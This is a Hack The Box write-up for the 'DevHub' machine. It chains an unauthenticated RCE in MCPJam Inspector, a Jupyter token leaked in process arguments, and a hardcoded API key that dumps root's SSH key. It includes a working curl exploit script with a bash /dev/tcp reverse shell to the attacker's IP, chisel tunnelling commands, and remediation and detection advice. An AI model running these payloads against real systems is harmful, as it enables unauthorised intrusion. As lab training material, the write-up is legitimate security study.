---
layout: writeup
title: DevHub
os: Linux
difficulty: Medium
platform: Hack The Box
date: 2026-10-10
filename: devhub.md
summary: >-
  RCE against a vulnerable MCP Inspector (CVE-2026-23744), lateral movement via
  a leaked token recovered from process arguments, and root through an
  API-key-gated SSH key dump.
---

# DevHub - Hack The Box


## Summary

DevHub is a medium-difficulty box from HTB. The web server on port `80/tcp` points to an MCPJam Inspector, a developer tool for MCP servers, running on port `6274/tcp`. It is vulnerable to `CVE-2026-23744`, which allows unauthenticated RCE via the `/api/mcp/connect` endpoint. Exploiting this vulnerability gets us a shell as the `mcp-dev` user.

Enumerating the listening services, a web server (`TornadoServer/6.5.4`) is found running on port `8888/tcp`. Using `chisel`, we forward this port back to our machine and navigate to the server in a browser. A valid token can be recovered from the machine's running processes, granting a shell as the `analyst` user.

We escalate to root through another service, running as root on port `5000/tcp`. Its source code in the `/opt` directory, readable as `analyst`, contains a hardcoded API key. With that key, a single `POST` request makes the service dump the root user's private SSH key.

---

## Recon

### Nmap

```bash
nmap -sCV --min-rate=10000 -vv -oN nmap/devhub 10.129.31.113
```

| Port | Service | Version |
|------|---------|---------|
| 22 | ssh | OpenSSH 8.9p1 |
| 80 | http | nginx 1.18.0 |
| 6274 | unknown | - |

---

## Foothold (User)

### Vulnerability

Accessing the web application on port `80` points to an MCP Inspector running on port `6274/tcp`. The settings panel reveals the version: `MCPJam Version: v1.4.2`. A quick Google search points to `CVE-2026-23744` ([GHSA-232v-j27c-5pp6](https://github.com/advisories/GHSA-232v-j27c-5pp6)), a critical RCE in MCPJam Inspector `1.4.2` and earlier, fixed in `1.4.3`.

MCPJam Inspector is a development tool for testing MCP servers. To test a local (stdio) MCP server, it starts the server process itself: the `/api/mcp/connect` endpoint takes a `serverConfig` with a `command`, its `args` and an `env`, and runs that command. Two things make this exploitable:

- The endpoint requires no authentication, so it runs any command it is given.
- The inspector listens on `0.0.0.0` instead of `127.0.0.1` by default, so anyone who can reach port `6274` can call it.

No user interaction is needed: one HTTP request runs a command as the user the inspector runs as.

### Exploitation

I wrote a script to trigger the reverse shell. It takes the target's IP, the attacker's IP and the listening port as arguments.

```bash
#!/bin/bash

TARGET="$1"
IP="$2"
PORT="$3"

if [[ -z "$TARGET" || -z "$IP" || -z "$PORT" ]]; then
    echo "Usage: $0 <target> <ip> <port>"
    exit 1
fi

curl "http://$TARGET:6274/api/mcp/connect" \
    --header "Content-Type: application/json" \
    --data "{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/$IP/$PORT 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
```

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

---

## Lateral Movement

### Enumeration

The `/etc/passwd` file reveals another user, `analyst`.
```bash
mcp-dev@devhub:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
```

I used `find` to enumerate all files owned by this user. It turns up a `server.py` file in the `/opt` directory, but attempting to `cat` it returns a permissions error.
```bash
mcp-dev@devhub:~$ find / -path /proc -prune -o -user analyst 2>/dev/null
/opt/opsmcp
/opt/opsmcp/server.py
/home/analyst
/proc

mcp-dev@devhub:~$ cat /opt/opsmcp/server.py 
cat: /opt/opsmcp/server.py: Permission denied
```

Enumerating the machine's listening ports exposes ports `5000/tcp` and `8888/tcp`.
```bash
mcp-dev@devhub:~$ ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                    
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*                                              
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*                                              
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                              
tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*                                              
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*                                              
tcp   LISTEN 0      511          0.0.0.0:6274      0.0.0.0:*    users:(("node-MainThread",pid=1284,fd=29))
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                              
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                              
tcp   LISTEN 0      128             [::]:22           [::]:*
```

Using `curl`, I can identify the services running there.
```bash
mcp-dev@devhub:~$ curl -I http://127.0.0.1:5000
HTTP/1.1 200 OK
Server: Werkzeug/3.1.6 Python/3.10.12
Date: Thu, 25 Jun 2026 15:43:22 GMT
Content-Type: application/json
Content-Length: 150
Connection: close

mcp-dev@devhub:~$ curl -I http://127.0.0.1:8888
HTTP/1.1 405 Method Not Allowed
Server: TornadoServer/6.5.4
Content-Type: text/html; charset=UTF-8
Date: Thu, 25 Jun 2026 15:43:28 GMT
Content-Length: 87
```

### Exploitation

I used `chisel` to forward both ports back to my machine: `5000` to local port `9000`, and `8888` to local port `8888`.
```bash
[On target machine:]
mcp-dev@devhub:/tmp$ ./chisel client <ATTACKER'S IP>:8080 R:9000:127.0.0.1:5000 R:8888:127.0.0.1:8888

[On my machine:]
┌──(kali@blackops)-[~/…/htb/boxes/medium/devhub]
└─$ chisel server -p 8080 --reverse
```

The service on port `5000/tcp` is now accessible on local port `9000/tcp`. However, its endpoints (such as `/tools/call`, used later) require an `X-API-Key`, which we don't have.
```bash
error	"Unauthorized"
message	"Valid X-API-Key header required"
```

On port `8888/tcp`, a token is required. In `ps aux`, the `analyst` user is running a command that references port `8888/tcp`. Using `grep`, the full command is revealed, and a token is shown.
```bash
mcp-dev@devhub:/tmp$ ps aux | grep analyst
analyst     1094  0.1  2.4 183076 97268 ?        Ss   15:04   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```

The root cause here is that JupyterLab was started with its token on the command line. Every user can read another process's arguments through `/proc/<pid>/cmdline`, which is what `ps` shows, so any local user can grab the token.

This token can be used to authenticate to the web server. The terminal there provides shell access to the machine as the `analyst` user. The user flag can be found in the `analyst` user's home directory.

---

## Privilege Escalation (Root)

### Enumeration

As `analyst`, we can now read the `/opt/opsmcp/server.py` file. A valid `X-API-Key` is hardcoded inside it.
```bash
# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The source code also reveals the app's full logic. Calling the `ops._admin_dump` tool with `ssh_keys` as the target dumps the root SSH key.
```bash
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
```

### Root Cause

The service on port `5000/tcp` runs as root and it can read `/root/.ssh/id_rsa`. It offers an "emergency recovery" tool, `ops._admin_dump`, that hands root's private SSH key to anyone with a valid API key. That key is the only protection, and it is hardcoded in `server.py`, which `analyst` can read.

### Exploitation

The service returns the key JSON-encoded, with literal `\n` characters instead of real newlines. Python is on the box, it was used decode the JSON and write a valid key file in one step. The API key works for any local user, so the request can be sent from the `mcp-dev` shell as well.
```bash
mcp-dev@devhub:/tmp$ curl -s -X POST http://127.0.0.1:5000/tools/call -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' | python3 -c 'import json, sys; sys.stdout.write(json.load(sys.stdin)["root_private_key"])' > ~/root-key
mcp-dev@devhub:/tmp$ chmod 600 ~/root-key
```

With the key saved, I SSH in as `root`.
```
mcp-dev@devhub:~$ ssh -i root-key root@devhub
The authenticity of host 'devhub (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devhub' (ED25519) to the list of known hosts.

root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Remediation & Detection

**Foothold: MCPJam Inspector RCE (CVE-2026-23744)**
- Fix: upgrade `@mcpjam/inspector` to `1.4.3` or later, and keep developer tools bound to `127.0.0.1`
- Detect: the inspector's `node` process spawning `bash`, followed by an outbound connection from the box to an unknown host

**Lateral movement: Jupyter token in the process list**
- Fix: pass the token through a config file or environment variable that only `analyst` can read, and mount `/proc` with `hidepid=2` so users can't see each other's processes
- Detect: a new binary like `chisel` running and holding an outbound connection

**Root: credential-dump tool behind a hardcoded API key**
- Fix: remove the `ops._admin_dump` tool, keep API keys out of source code, run the service as an unprivileged user, and disable root SSH logins. The service's source is also owned by `analyst`. Code that runs as root should be owned by root
- Detect: an `auditd` watch on `/root/.ssh/id_rsa`, and a root SSH login from `127.0.0.1` in the `sshd` logs